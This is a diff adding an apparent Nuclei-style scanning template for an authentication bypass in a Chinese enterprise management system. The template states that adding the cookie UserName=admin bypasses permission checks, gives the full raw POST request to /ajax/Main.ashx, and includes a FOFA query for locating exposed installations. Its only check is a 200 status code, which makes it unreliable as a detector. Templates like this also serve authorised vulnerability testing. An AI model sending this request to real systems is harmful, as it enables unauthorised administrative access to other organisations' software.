@@ -1,0 +1,40 @@
+id: poc-vgcx463uauvnggou
+info:
+  name: 超易企业管理系统Main.ashx存在权限绕过漏洞
+  author: hacktwo
+  severity: medium
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/vgcx463uauvnggou'
+  tags: unauth,2026
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: vgcx463uauvnggou
+    fofa: body="超易企业管理系统"&&body="超易软件"
+http:
+- raw:
+  - '在cookie中添加UserName=admin;即可绕过权限校验
+
+
+    POST /ajax/Main.ashx HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:150.0) Gecko/20100101 Firefox/150.0
+
+    Accept: application/json, text/ｊａｖａｓｃｒｉｐｔ, */*; q=0.01
+
+    Accept-Language: zh-CN,zh;q=0.9,zh-TW;q=0.8,zh-HK;q=0.7,en-US;q=0.6,en;q=0.5
+
+    Accept-Encoding: gzip, deflate
+
+    X-Requested-With: XMLHttpRequest
+
+    Connection: close
+
+    Cookie: UserName=admin;
+
+    Content-Length: 0'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
